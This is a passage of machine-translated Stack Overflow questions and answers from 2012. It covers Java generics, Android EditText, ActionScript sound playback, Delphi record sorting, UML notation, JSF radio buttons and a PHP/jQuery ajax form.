您的第一个错误是因为`binarySearch`您尝试使用的版本（带有比较器的版本）对参数的类型有限制。它是这样声明的：`static <T> int binarySearch(T[] a, T key, Comparator<? super T> c)`. 因此，如果您有一个`Comparator<E>`，那么您将需要一个`E[]`as 第一个参数，而您有一个`Object[]`. 你必须想办法做到`E[]`。

但实际上对你来说，你正在尝试做你根本不需要使用比较器。该方法有一个版本`binarySearch`不使用比较器，并且它已经使用元素的自然顺序来比较元素。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T14:04:28.527

你必须通过`Class<E>`，所以你可以实例化一个`E`. （`<E>`在运行时删除，E 只是对象。）

```
Class<E> klazz;

E[] firstItemInArray2 = (E[])
        java.lang.reflect.Arrays.newInstance(klazz, numArraysInUse); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T14:14:24.850

你没有申报`<E>`。您必须将您的定义`CompareElement`如下：

```
public class CompareElement<E extends Comparable> implements Comparator<E> {
    public int compare(E firstItem, E secondItem) {
        return firstItem.compareTo(secondItem);
    }
} 
```

然后声明如下：

```
Comparator<?> comparator = new CompareElement<?>(); 
```

而`?`应该是您要比较的类型。

# android - settext 在 android 中编辑文本

> ID：12839949
> 
> 赞同：0
> 
> 时间：2012-10-11T12:50:22.840
> 
> 标签：android, android-edittext

我有一个活动，它的主题是 dialog 。在这个活动中，有 10 个编辑文本。对于一个编辑框，我无法为编辑框设置文本。

公共无效 onCreate(Bundle savedInstanceState) {

```
 this.requestWindowFeature(Window.FEATURE_NO_TITLE);     
    is_tablet=SharedVariables.sharedPrefDate.getBoolean("isTablet", false);
    if(!is_tablet){
        super.setTheme(android.R.style.Theme_Black_NoTitleBar);
    }
    //overridePendingTransition(R.anim.slide_bottom_to_top,0);
    super.onCreate(savedInstanceState);
    activity=UpdateCasePersonAddressScreen.this;
    setContentView(R.layout.update_person_address_screen);

    //allocating memory to objBLAddCasePersonScreenOperations
    objBLAddPersonAddressScreenOperations=new BLAddUpdatePersonAddressScreenOperations();
    objBLCommonOperations=new BLCommonOperations(); 
    getAllIds();

    //objPersonAddress=new clsPersonAddress();
    bundle = getIntent().getExtras();

    //code to get all objects using Bundle from previous activity
    if(bundle!=null){

        objPersonAddress = (clsPersonAddress) bundle.getParcelable("clsPersonAddress");
        System.out.println("from Extras");
        bundle=null;
    }        

    initTextFields();
    inputMethodManager = (InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
    /* if (inputMethodManager != null) {
        inputMethodManager.toggleSoftInput(InputMethodManager.SHOW_FORCED, 0);
    }*/
}
public void initTextFields(){

    updatePersonAddressTitleEditText.setText(objPersonAddress.getAddressTitle());
    updatePersonAddressMemoEditText.setText(objPersonAddress.getAddressMemo());
    updatePersonAddressNameEditText.setText(objPersonAddress.getAddressName());
    updatePersonAddressBusinessNameEditText.setText(objPersonAddress.getAddressBusinessName());
    updatePersonAddressWorkPhoneEditText.setText(objPersonAddress.getAddressWorkPhone());
    updatePersonAddressHomePhoneEditText.setText(objPersonAddress.getAddressHomePhone());
    updatePersonAddressMobilePhoneEditText.setText(objPersonAddress.getAddressMobilePhone());
    updatePersonAddressAddressLine1EditText.setText(objPersonAddress.getAddressLine1());
    updatePersonAddressAddressLine2EditText.setText(objPersonAddress.getAddressLine2());
    updatePersonAddressCityEditText.setText(objPersonAddress.getAddressCity());

    System.out.println("objPersonAddress.getAddressState()))))))))))))))))))))))))))))))))))"+objPersonAddress.getAddressState());

    updatePersonAddressStateEditText.setText(objPersonAddress.getAddressState().toString());//setText(objPersonAddress.getAddressState(), TextView.BufferType.EDITABLE);
    System.out.println("updatePersonAddressStateEditText text is now is:"+updatePersonAddressStateEditText.getText().toString()+"null check:"+updatePersonAddressStateEditText.toString());
    System.out.println("below objPersonAddress.getAddressState()))))))))))))))))))))))))))))))))))"+objPersonAddress.getAddressState());

    updatePersonAddressZipEditText.setText(objPersonAddress.getAddressZip());
    updatePersonAddressCountryEditText.setText(objPersonAddress.getAddressCountry());
} 
```

任何机构都可以在这个问题上帮助我。提前感谢任何帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T13:34:02.163

```
EditText edit;// define it before onCreate

edit=(EditText)findViewById(R.id.edittext); //get it from xml

String value="123";
//simply use 

edit.setText(value); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-11T13:09:13.040

安卓原生：

```
String text = "Example";
EditText edtText = (EditText) findViewById(R.id.edtText);
edtText.setText(text);` 
```

看！EditText 仅接受字符串值，如有必要转换为字符串。

如果是 int、double、long 值，请执行以下操作：

```
String.value(value); 
```

示例：

```
int i = 5;
edtText.setText(String.value(i)); 
```

安卓注解：

```
@ViewById
EditText edtText; 
```

设置：

```
@UiTread
void setText(){
    edtText.setText("Text");
} 
```

致电：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);        
    this.setText();
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-11T12:55:23.427

就这样写

```
EditText editText=(EditText)findViewById(R.id.editText1);
        editText.setText("abc"); 
```

# actionscript-3 - 在 Actionscript 2 中随机化 MP3 文件

> ID：12839955
> 
> 赞同：0
> 
> 时间：2012-10-11T12:50:32.557
> 
> 标签：actionscript-3, actionscript, random, mp3, actionscript-2

```
import flash.media.Sound;
import flash.net.URLRequest;
import flash.media.SoundChannel;
import flash.events.Event;

 playsong();
//var songs:Array=new Array("part0.mp3","part1.mp3","part2.mp3","part3.mp3","part4.mp3","part5.mp3","part6.mp3","part7.mp3","part8.mp3","part9.mp3","part10.mp3","part11.mp3","part12.mp3","part13.mp3","part14.mp3","part15.mp3","part16.mp3","part17.mp3","part18.mp3","part19.mp3","part20.mp3","part21.mp3","part22.mp3","part23.mp3","part24.mp3","part25.mp3","part26.mp3","part27.mp3","part28.mp3","part29.mp3","part30.mp3","part31.mp3","part32.mp3","part33.mp3","part34.mp3","part35.mp3","part36.mp3","part37.mp3","part38.mp3","part39.mp3","part40.mp3","part41.mp3","part42.mp3","part43.mp3","part44.mp3","part45.mp3","part46.mp3","part47.mp3","part48.mp3","part49.mp3","part50.mp3","part51.mp3","part52.mp3","part53.mp3","part54.mp3","part55.mp3","part56.mp3","part57.mp3","part58.mp3","part59.mp3","part60.mp3","part61.mp3","part62.mp3","part63.mp3","part64.mp3","part65.mp3","part66.mp3","part67.mp3","part68.mp3","part69.mp3","part70.mp3","part71.mp3","part72.mp3","part73.mp3","part74.mp3","part75.mp3","part76.mp3","part77.mp3","part78.mp3","part79.mp3","part80.mp3","part81.mp3","part82.mp3","part83.mp3","part84.mp3","part85.mp3","part86.mp3","part87.mp3","part88.mp3","part89.mp3","part90.mp3","part91.mp3","part92.mp3","part93.mp3","part94.mp3","part95.mp3","part96.mp3","part97.mp3","part98.mp3","part99.mp3","part100.mp3","part101.mp3");
 var sound:Sound;
 var soundChannel:SoundChannel;
 var randnum:uint;
 function playsong()
 {
 randnum=Math.floor(Math.random()*127);
 sound=new Sound();
 var songs:String= "part" + randnum + ".mp3";  
 sound.load(new URLRequest("file:///D:/parts/"+songs));
 soundChannel=sound.play();
 soundChannel.addEventListener(Event.SOUND_COMPLETE,playrandomsong);
 }
 function playrandomsong(e:Event)
 {
 playsong();
 } 
```

这是我使用的 Actionscript 3 代码，用于从本地目录的数组中随机播放 MP3。它有效，但我的问题是我使用它的应用程序较旧并且不支持 AS3 - 仅支持 AS2 和更早版本。有谁知道这个代码的等价物是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:34:27.770

AS2中没有导入的包，没有、、、`Event`类`SoundChannel`，`URLRequest`类[`Sound`](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/2/00001513.html#467182)接口不同。

未经测试：

```
var sound:Sound;
var randnum:Number;

function playsong()
{
    randnum = Math.floor(Math.random() * 127);
    var songs:String = "part" + randnum + ".mp3";  

    sound = new Sound();
    sound.onSoundComplete = playrandomsong;
    sound.loadSound("file:///D:/parts/" + songs, true);
}

function playrandomsong()
{
    playsong();
} 
```

# arrays - 将动态记录数组传递给Delphi中的mergesort

> ID：12839957
> 
> 赞同：0
> 
> 时间：2012-10-11T12:50:37.483
> 
> 标签：arrays, delphi, delphi-7, record, sorting

我有一个记录类型和一个由该记录类型组成的动态数组。我将它传递给一个合并排序例程并尝试将它的一个字段属性设置为布尔值，但似乎没有生效。

我通过其他方式研究了对记录的排序数组（参见自定义记录数组的快速排序：[http](http://en.wikibooks.org/wiki/Algorithm_Implementation/Sorting/Quicksort#Delphi) ://en.wikibooks.org/wiki/Algorithm_Implementation/Sorting/Quicksort#Delphi ）或这里：[对数组进行排序的最佳方法](https://stackoverflow.com/questions/41733/best-way-to-sort-an-array)（我可以没有得到这些建议，主要是因为创建了一个comaring函数）。这个问题：[按字母顺序排列数组？](https://stackoverflow.com/questions/7492993/sorting-of-arrays-alphabetically)很有帮助并且有效，但是这种排序非常慢。

代码：

```
type    
       TCustomRecord = Record
        fLine     : AnsiString; //full line
        fsubLine     : AnsiString; // part of full line
        isDuplicate : boolean;  //is that subline duplicate in another line
        isRefrence     : boolean; // is this line from a refrence file or the one being deduped
        fIndex    : Cardinal; // original order line was loaded
       end;
      TCustomRecordArray = array of TCustomRecord; 

function Merge2(var Vals: array of TCustomRecord ):Integer;
var
  AVals: array of TCustomRecord;

   //returns index of the last valid element
  function Merge(I0, I1, J0, J1: Integer):Integer;
  var
    i, j, k, LC:Integer;
  begin
    LC := I1 - I0;
    for i := 0 to LC do
      AVals[i]:=Vals[i + I0];
      //copy lower half or Vals into temporary array AVals

    k := I0;
    i := 0;
    j := J0;
    while ((i <= LC) and (j <= J1)) do
    if (AVals[i].fsubLine < Vals[j].fsubLine) then
    begin
      Vals[k] := AVals[i];
      if Vals[k].isRefrence = False then
        Vals[k].isDuplicate := False;
      inc(i);
      inc(k);
    end
    else if (AVals[i].fsubLine > Vals[j].fsubLine) then
    begin
      Vals[k]:=Vals[j];
      if Vals[k].isRefrence = False then
        Vals[k].isDuplicate := False;
      inc(k);
      inc(j);
    end else
    begin //duplicate
      Vals[k] := AVals[i];
      if Vals[k].isRefrence = False then
        Vals[k].isDuplicate := True;
      inc(i);
      inc(j);
      inc(k);
    end;

    //copy the rest
    while i <= LC do begin
      Vals[k] := AVals[i];
      inc(i);
      inc(k);
    end;

    if k <> j then
      while j <= J1 do begin
        Vals[k]:=Vals[j];
        inc(k);
        inc(j);
      end;

    Result := k - 1;
  end;

 //returns index of the last valid element

  function PerformMergeSort(ALo, AHi:Integer): Integer; //returns
  var
    AMid, I1, J1:Integer;
  begin

  //It would be wise to use Insertion Sort when (AHi - ALo) is small (about 32-100)
    if (ALo < AHi) then
    begin
      AMid:=(ALo + AHi) shr 1;
      I1 := PerformMergeSort(ALo, AMid);
      J1 := PerformMergeSort(AMid + 1, AHi);
      Result := Merge(ALo, I1, AMid + 1, J1);
    end else
      Result := ALo;
  end;

begin
  //SetLength(AVals, Length(Vals) + 1 div 2);
  SetLength(AVals, Length(Vals) div 2 + 1);
  Result := 1 + PerformMergeSort(0, High(Vals));
end; 
```

问题：我怎样才能有效地排序，最好使用mergesort，这个记录数组并根据该排序设置它的一些属性？谢谢你。

更新：我添加了一个指针类型并对指针数组进行了修改的合并排序。结果证明这是对记录数组进行排序的非常快速的方法。我还添加了一个比较例程，它添加了我需要的标志。我无法做的唯一部分是根据它们是否属于文件 A 或参考文件来为重复项添加一个标志。

代码：

```
 type    
          PCustomRecord = ^TCustomRecord; 
          TCustomRecord = Record
            fLine     : AnsiString; //full line
            fsubLine  : AnsiString; // part of full line
            isDuplicate : boolean;  //is that subline duplicate in another line
            isRefrence     : boolean; // line from a refrence file or the one being deduped
            isUnique  : boolean; //flag to set if not refrence and not dupe
            fIndex    : Cardinal; // original order line was loaded
           end;
          TCustomRecordArray = array of TCustomRecord;
          PCustomRecordList = ^TCustomRecordArray;

//set up actual array
//set up pointer array to point at actual array
//sort by mergesort first
// then call compare function - this can be a procedure obviously

function Compare(var PRecords: array of PCustomRecord; iLength: int64): Integer;
var
  i : Integer;
begin
  for i := 0 to High(PRecords) do
  begin
    Result := AnsiCompareStr(PRecords[i]^.fsubline, PRecords[i+1]^.fsubline);
    if Result=0 then
    begin
      if (PRecords[i].isrefrence = False) then
        PRecords[i].isduplicate := True
      else if (PRecords[i+1].isrefrence = False) then
        PRecords[i+1].isduplicate := True;
    end;
  end;
end; 

procedure MergeSort(var Vals:array of PCustomRecord;ACount:Integer);
var AVals:array of PCustomRecord;

  procedure Merge(ALo,AMid,AHi:Integer);
  var i,j,k,m:Integer;
  begin
    i:=0;
    for j:=ALo to AMid do
    begin
      AVals[i]:=Vals[j];
      inc(i);
      //copy lower half or Vals into temporary array AVals
    end;

    i:=0;j:=AMid + 1;k:=ALo;//j could be undefined after the for loop!
    while ((k < j) and (j <= AHi)) do
    if (AVals[i].fsubline) <= (Vals[j].fsubline) then
    begin
      Vals[k]:=AVals[i];
      inc(i);inc(k);
    end
    else if (AVals[i].fsubline) > (Vals[j].fsubline) then
    begin
      Vals[k]:=Vals[j];
      inc(k);inc(j);
    end;

    {locate next greatest value in Vals or AVals and copy it to the
     right position.}

    for m:=k to j - 1 do
    begin
      Vals[m]:=AVals[i];
      inc(i);
    end;
    //copy back any remaining, unsorted, elements
  end;

  procedure PerformMergeSort(ALo,AHi:Integer);
  var AMid:Integer;
  begin
    if (ALo < AHi) then
    begin
      AMid:=(ALo + AHi) shr 1;
      PerformMergeSort(ALo,AMid);
      PerformMergeSort(AMid + 1,AHi);
      Merge(ALo,AMid,AHi);
    end;
  end;

begin
  SetLength(AVals, ACount div 2 + 1);
  PerformMergeSort(0,ACount - 1);
end; 
```

对于不到一秒钟的小文件，这一切都非常快。不过，对数组中带有重复标志而不是引用标志的项目进行重复数据删除是相当具有挑战性的。由于合并排序是一种稳定的排序，我尝试通过布尔标志进行排序，但没有得到我期望的结果。我用 a`TStringlist`查看我以前的标志是否设置正确并且工作正常。时间从 1 秒增加到 6 秒。我知道必须有一种简单的方法来`isUnique`标记**没有** `TStringlist`.

这是我尝试过的：

```
function DeDupe(var PRecords: array of PCustomRecord; iLength: int64): Integer;
var
  i : Integer;
begin
  for i := 0 to High(PRecords) do
  begin
    if (PRecords[i]^.isrefrence = False) and (PRecords[i+1]^.isrefrence = false)then
    begin
      Result := AnsiCompareStr(PRecords[i]^.isduplicate, PRecords[i+1]^.isduplicate);
      if Result = 0 then PRecords[i]^.isUnique := True;
    end
    else
    begin
      Continue;
    end;
  end;
end; 
```

这并没有得到所有的值，我没有看到它有什么不同，因为我仍然看到很多重复项。我认为逻辑是错误的。

感谢所有帮助的伟大灵魂。请允许我受益，我可能已经知道如何推导 a`TObject`以及如何使用 a `TStringList`，所以重点是数组。

问题：帮助我执行上述功能或程序，用 *isRefrence = false 和 isDuplicate = True 和唯一标记重复项*

编辑 3：我能够通过使用布尔标志来消除重复项。这有助于在不改变数组大小的情况下保持数组稳定。我相信它比使用`TList`后代或`TStringList`. 使用诸如数组之类的基本容器在易于编码方面存在局限性，但非常有效，因此我不会传递它。指针使排序变得轻而易举。我不确定当我使用指针数组时如何设置指向我的数组的指针，就像我使用我的常规数组一样。我是否取消了它并没有什么区别。我这样设置指针数组：

```
 iLength := Length(Custom_array); //get length of actual array
  SetLength(pcustomRecords, iLength); // make pointer array equal + 1

  for M := Low(Custom_array) to High(Custom_array) do //set up pointers
  begin
    pcustomRecords[M] := @Custom_array[M]; 
  end; 
```

我尝试尽可能多地将排序与正在排序的实际数据分开，但我确信可以改进。

```
///////////////////////////////////////////////////////////////////
function Comparesubstring(Item1, Item2: PCustomRecord): Integer;
begin
  Result := AnsiCompareStr(item1^.fsubline, item2^.fsubline);
end;
///////////////////////////////////////////////////////////////////
function CompareLine(Item1, Item2: PCustomRecord): Integer;
begin
  Result := AnsiCompareStr(item1^.fLine, item2^.fLine);
end;
///////////////////////////////////////////////////////////////////
function Compare(var PRecords: array of PCustomRecord; iLength: int64): Integer;
var
  M, i : Integer;
begin
  M := Length(PRecords);
  for i := 1 to M-1 do
  begin
    Result := Comparesubstring(PRecords[i-1], PRecords[i]);
    if Result=0 then
    begin
      if (PRecords[i-1].isRefrence = False) then
        PRecords[i-1].isduplicate := True
      else if (PRecords[i].isRefrence = False) then
        PRecords[i].isduplicate := True;
    end;
  end;
end;
/////////////////////////////////////////////////////////////////// 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T13:01:46.987

1）不要复制数据！使用指针。您应该创建指向这些数据记录的指针列表/数组，然后对指针进行排序。排序完成后 - 只需根据指针数组创建新的数据数组。指针移动是单 CPU 命令。SizeOf(your record) 是 >> SizeOf(pointer) 并且在移动时要慢得多。

2) Mergesort 在大量数据上摇摆不定，不适合内存。如果您有 10 GB 的数据，则无法在 Win32 程序允许的 2 GB 内存中对它们进行排序。因此，您必须在它们在磁盘上时对其进行排序。这就是 Mergesort 的利基市场。如果所有数据都在内存中，为什么不使用现成的 QuickSort 例程呢？

所以制作一个TList，用指针填充它`type PCustomRecord = ^TCustomRecord;`，实现适当的比较函数并通过TList.Sort方法调用checked quicksort。

[http://docwiki.embarcadero.com/CodeExamples/XE2/en/TListSort_(Delphi)](http://docwiki.embarcadero.com/CodeExamples/XE2/en/TListSort_%28Delphi%29)

列表排序后 - 创建并填充新的数据数组。创建新数组后 - 释放列表并删除旧的源数组。

* * *

如果可能 - 检查数据是否适合内存。如果内存不足，仅驻留在磁盘上搜索。它会更慢，更慢。

* * *

我在学校做过...... Mergesort 不是递归的。这是非常基本的循环。由于它的简单性，我实现了它。我仍然没有对 QuickSort 的直觉，可以与之比较。

在伪代码中它看起来像

```
FrameSize := 1;
Loop start:
  Phase 1: splitting
     Loop until not empty TempMergedDataFile:
        Read record by record from TempMergedDataFile 
            and write each of them into TempSplitDataFile-1
            up to FrameSize times
        Read record by record from TempMergedDataFile 
            and write each of them into TempSplitDataFile-2
            up to FrameSize times
     Loop end
     Delete TempMergedDataFile 
  Phase 2: sorting-merging
     Loop until not empty TempSplitDataFile-1 and TempSplitDataFile-2:
        Read record by record from both TempSplitDataFile-1 and TempSplitDataFile-2
          up to FrameSize each (2xFrameSize in total in each iteration)
          write them sorted into TempMergedDataFile
     end loop
     delete TempSplitDataFile-1 and TempSplitDataFile-2
  Phase 3: update expectations
     FrameSize := FrameSize * 2
     if FrameSize > actual number of records - then exit loop, sort complete
End loop 
```

小心第 2 阶段的实施。如果文件之一超出帧，则与实际值或 nil 进行比较。嗯，这个想法很明显，可能在某个地方演示过。只是在这部分迂腐。可能 FSM 实现可能很容易。

明显的优化：

1.  将所有文件放在不同的物理专用 HDD 上，因此每个 HDD 将处于线性读/写模式
2.  合并阶段 1 和阶段 2：使 TempMergedDataFile 虚拟化，实际上由 TempSplitDataFile-3 和 TempSplitDataFile-4 组成。在写入数据时将数据拆分为下一个大小的帧。
3.  如果使用 SSD 或闪存卡进行存储，则数据复制会磨损硬件。最好对某种“指针”或“索引”进行排序以进行实际排序。也有很小的机会，虽然完整的数据帧超过了 RAM，但仅仅是“索引数组”就可以了。但是，对于未经测试的实际 HDD，我最好坚持使用幼稚的“复制和复制再复制”方法。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-11T13:26:15.297

The first comment to make is that your basic design is very weak. You have mixed the sorting code and the compare/exchange code all in together. If ever you need to sort different data, then you'll have to start again. You need to decouple the sorting code from the code that understands the data.

The way to achieve that decoupling is to implement a generic sort routine that knows nothing about the data. Instead all it needs to know is how to compare two elements, and how to exchange two elements. All the common in-memory sorting routines can be implemented efficiently that way.

The other problem you have, I guess, is that your code will spend a lot of time copying the data around. Instead of doing that, use a layer of indirection. What I mean by that is that you should not attempt to modify the original array. Instead create an array of indices into the data array, and sort the array of indices rather than the array of data.

To give you an idea of that, here's how it might look:

```
var
  Data: array of TData;
  Indices: array of Integer;

function CompareIndices(Index1, Index2: Integer): Integer;
begin
  Result := CompareData(Data[Indices[Index1]], Data[Indices[Index2]]);
end;

procedure SwapIndices(Index1, Index2: Integer);
var
  Temp: Integer;
begin
  Temp := Indices[Index1];
  Indices[Index1] := Indices[Index2];
  Indices[Index2] := Temp;
end; 
```

Then, in order to sort the array you do something like this:

```
N := Length(Data);
SetLength(Indices, N);
for i := 0 to high(Indices) do 
  Indices[i] := i;
Sort(CompareIndices, SwapIndices, N); 
```

Or, as yet another alternative, instead of an array of indices, use an array of pointers to the elements of the data array.

Now, I've used global variables here for the sake of clarity of exposition. In reality you'd likely want to wrap this up into a class, or at least make the compare and swap functions be methods of objects. That's how I did it in my Delphi 6 code base. The interface looked like this:

```
type
  TCompareIndicesFunction = function(Index1, Index2: Integer): Integer of object;
  TExchangeIndicesProcedure = procedure(Index1, Index2: Integer) of object;

procedure QuickSort(Compare: TCompareIndicesFunction; 
  Exchange: TExchangeIndicesProcedure; const Count: Integer); 
```

Once you get on top of the concept of separating the sort algo from the data then you'll make some progress. It then becomes trivial to swap out one sorting algo for another. You can compare them easily. You can readily measure whether or not the indirection approach is worthwhile. And so on.

So, my absolute number one piece of advice for you is to throw away the code in the question and separate sorting from data handling, as nature intended.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T17:27:08.570

我知道没有直接回答这个问题，但前提是数据可以放入内存中——这似乎就像您使用数组一样。

我会转储所有这些，创建一些对象，将它们放在 TObjectList 中。使用 TObjectList.Sort(@myComparefunction) 使用您自己的比较进行排序。您可以声明多个排序例程。在排序功能期间，您可以随意设置其他对象属性。它非常快，并且可以减轻您似乎正在遭受的很多痛苦:)

# class - UML：这种关系是什么意思？

> ID：12839960
> 
> 赞同：1
> 
> 时间：2012-10-11T12:50:41.050
> 
> 标签：class, uml, diagram

当我遇到这个符号时，我开始从 Netbeans IDE 中的现有 Java 项目生成 UML 类图（见图）。这是什么意思？

提前致谢

![在此处输入图像描述](../Images/441e9e2d7a4e33a5aaed15c208585a36.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T13:03:10.787

大多数时候，UML 关系末尾的圆圈表示所有权。虚线端的实体由不带点的实体拥有。在您的示例中，`SynchronizationResult`拥有`internalCOmmandReceived`在其上定义的任何实体。

通常，这些点是阴影不透明的。但是看到这是使用 Netbeans 生成的，这可能是他们描述同一事物的方式。

编辑：我可能已经把那些颠倒了。在 IBM[对 UML 基础](http://www.ibm.com/developerworks/rational/library/content/RationalEdge/sep04/bell/)的解释下，这个符号用于表示***成员资格***。如果您滚动到指南的*包*方面（第 9 节），您将看到说明

希望这可以帮助。很抱歉之前的混淆。

# jsf - JSF 1.2：带有 a4j:support 的 selectOneRadio 无法按预期工作

> ID：12839965
> 
> 赞同：0
> 
> 时间：2012-10-11T12:51:13.483
> 
> 标签：jsf, jsf-1.2, ajax4jsf

嗨，我有以下代码片段。

它背后的想法是我想要一个选择，并且根据该选择，我想在表单上呈现一些额外的字段。

因此，如果用户回答“是”，那么他应该填写其他字段。这个 a4j:support 部分是因为我想在其他字段中保留任何用户输入（ajaxSingle="false"），并且我不想更新模型并运行任何验证器，直到用户填写整个表单（immediate="true"）。我只想更新一个属性“bean.answer”（a4j:actionparam），因为它控制可见的表单组件。

```
<h:form id="form">
    ...

    <h:selectOneMenu id="question"
                     value="#{bean.answer}" 
                     required="true">
        <f:selectItem itemLabel="No"  itemValue="false" />
        <f:selectItem itemLabel="Yes" itemValue="true" />
        <a4j:support event="onchange"
                     ajaxSingle="false"
                     immediate="true"
                     reRender="form">
            <a4j:actionparam name="question" 
                             value="$('form:question').value" 
                             assignTo="#{bean.answer}" 
                             noEscape="true"/>
            </a4j:support>
    </h:selectOneMenu>

...

    <h:outputText value="Additional field" 
                  styleClass="boldedFont" 
                  rendered="#{bean.answer}"/>
    <h:inputText  id="fieldId"
                  value="#{bean.additionalFieldValue}"
                  required="true"
                  rendered="#{bean.answer}"/>
...

</h:form> 
```

上面的代码可以按我的意愿工作。每次我更改答案时，bean 值 #{bean.answer} 都会更新，表单会重新呈现，并且其他字段会出现/消失。

**问题：**

我想将弹出列表（selectOneMenu）更改为单选按钮（selectOneRadio）。所以在我的新代码中，我只是将**h:selectOneMenu**更改为**h:selectOneRadio**：

```
<h:form id="form">
    ...

    <h:selectOneRadio id="question"
                     value="#{bean.answer}" 
                     required="true">
        <f:selectItem itemLabel="No"  itemValue="false" />
        <f:selectItem itemLabel="Yes" itemValue="true" />
        <a4j:support event="onchange"
                     ajaxSingle="false"
                     immediate="true"
                     reRender="form">
            <a4j:actionparam name="question" 
                             value="$('form:question').value" 
                             assignTo="#{bean.answer}" 
                             noEscape="true"/>
            </a4j:support>
    </h:selectOneRadio>

...

    <h:outputText value="Additional field" 
                  styleClass="boldedFont" 
                  rendered="#{bean.answer}"/>
    <h:inputText  id="fieldId"
                  value="#{bean.additionalFieldValue}"
                  required="true"
                  rendered="#{bean.answer}"/>
...

</h:form> 
```

但是这段代码不起作用。每次我更改答案时，bean 值 #{bean.answer} 都会更新为相同的“false”值，并且永远不会出现其他字段。

是否有任何简单的方法可以使用 h:selectOneRadio 实现与h **:** **selectOneMenu**相同的行为？

 **谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-14T11:36:37.277

该`onchange`事件是侦听一组单选按钮或复选框中更改的错误事件。它们基本上存在多个输入元素，而不仅仅是一个。你需要`onclick`。**

# php - 使用 Jquery / Ajax 并将 POST 响应文本写入 div 层

> ID：12839969
> 
> 赞同：1
> 
> 时间：2012-10-11T12:51:24.203
> 
> 标签：php, jquery, ajax, dynamic

我不是 jquery 专家，在过去的 6 个小时里，我一直试图让它工作。

我需要通过 ajax 发送 2 个单选按钮组和 1 个复选框数组，以从我的 php 页面获取 html 响应。

我已经通过添加表单/按钮并实际发布表单数据来验证处理 php 页面是否正常工作，但我想即时获取它并将其粘贴在响应 div 中。

感谢您提供的任何帮助。

的HTML：

```
<div class="formtaglong">
             <input type="radio" value="both" name="buildings" class="small_radio" checked > <span class="checkboxText">Both</span> 
             <input type="radio" value="thunder" name="buildings" class="small_radio" > <span class="checkboxText">Thunderhawk</span> 
             <input type="radio" value="center" name="buildings" class="small_radio" > <span class="checkboxText">Center Drive</span> 
             </div>

 <div class="formtaglong" id="checkall">
              <input type="checkbox" value="All" id="sa" name="sa" class="small_radio" > <span class="checkboxText">All</span>
             <?php
             while($row = mysql_fetch_array($query)){
                 echo '<input type="checkbox" value="'.$row['operator'].'" name="users[]" class="small_radio"> <span class="checkboxText">' .$row['operator'] . '</span> ';
             }
             ?>
             </div>
<div class="formtaglong">
             <input type="radio" id="alltime" value="alltime" name="daterange" class="small_radio" checked ><span class="checkboxText">All</span>
             <input type="radio" id="today" value="today" name="daterange" class="small_radio" > <span class="checkboxText">Today</span>
             <input type="radio" id="yesterday" value="yesterday" name="daterange" class="small_radio" > <span class="checkboxText">Yesterday</span>
             <input type="radio" id="threedays" value="threedays" name="daterange" class="small_radio" > <span class="checkboxText">3 Days</span>
             <input type="radio" id="thisweek" value="thisweek" name="daterange" class="small_radio" > <span class="checkboxText">This Week</span>
             <input type="radio" id="thismonth" value="thismonth" name="daterange" class="small_radio" > <span class="checkboxText">This Month</span>
             <input type="Submit" name="print" id="print" value="Submit" class="button">
             </div>

 <div id="results" class="shadeGood" style="max-height:620px; width:778px; overflow:auto; float:left;">
<!-- I SHOULD HOLD RESPONSE DATA -->
             </div> 
```

这是我到目前为止的jquery函数

```
<script>
                    $(document).ready(function(){
                    $("#main").click(function() {

                    //check radio buildings for selected value
                    var radBuild = $('input:radio[name=buildings]:checked').val();

                    //check radio daterange for selected value
                    var radDate = $('input:radio[name=daterange]:checked').val();

                    //create array for multiple possibilites from checkbox users
                    var chkUsers = [];
                    //loop through checkboxes appending values to array
                    $('#checkall :checked').each(function() {
                       chkUsers.push($(this).val());
                     });

                     //send the request
                    $.ajax({
                        url: "/pick-print-results.php",
                        type: "post",
                        data: "buildings=" + radBuild + "&daterange=" + radDate + "&users[]=" + chkUsers,
                        // callback for success
                        success: function(data){
                        $("results").html(data); 
                        } //ends sucess callback function
                    }); //ends .ajax function
                 }); //end #checkall.click function
              }); // ends ready function
                    </script> 
```

我应该注意目前所有的输入 div 层都嵌套在一个 div id#main 中，我只使用 click 函数进行测试。

编辑：通过请求添加 php 处理文件：... 注意.. 我没有费心清理结果，因为这个网页只会在网络之外在内部使用。

```
<?php
//Break up Refer on forward slash /
$refer =explode('/',$_SERVER['HTTP_REFERER']);

//IF Request Page not print-picks.php page then bounce them there...
if (end($refer)!='print-picks.php') {
      $host  = $_SERVER['HTTP_HOST'];
      $uri  = rtrim(dirname($_SERVER['PHP_SELF']), '/\\');
      $extra = 'print-picks.php';
      header("Location: http://$host$uri/$extra");
      exit();
}
include 'connect_to_db.php';
require_once ('doctype.php'); 

if(isset($_POST['daterange'])){ $daterange = $_POST['daterange']; }else{$daternage='';}
if(isset($_POST['users'])) { $users=$_POST['users']; }else{ $users='';}
if(isset($_POST['buildings'])){ $buildings=$_POST['buildings']; }else{$buildings='';}

//Build Daterange AND statment for query
switch ($daterange) {
    case "alltime":
    $query_chunk_2='';
    break;
    case "today":
    $query_chunk_2= 'AND pi.date_requested >= \'' . date('Y-m-d') . '\'';
    break;
    case "yesterday":
    $query_chunk_2='AND pi.date_requested >= \'' . date('Y-m-d',strtotime('-1 days')) . '\'';
    break;
    case "threedays":
    $query_chunk_2='AND pi.date_requested >= \'' . date('Y-m-d',strtotime('-3 days')) . '\'';
    break;
    case "thisweek":
    $query_chunk_2='AND pi.date_requested >= \'' . date('Y-m-d',strtotime('-7 days')) . '\'';
    break;
    case "thismonth":
    $query_chunk_2='AND pi.date_requested >= \'' . date('Y-m-d',strtotime('-30 days')) . '\'';
    break;
    default:
    $query_date='';
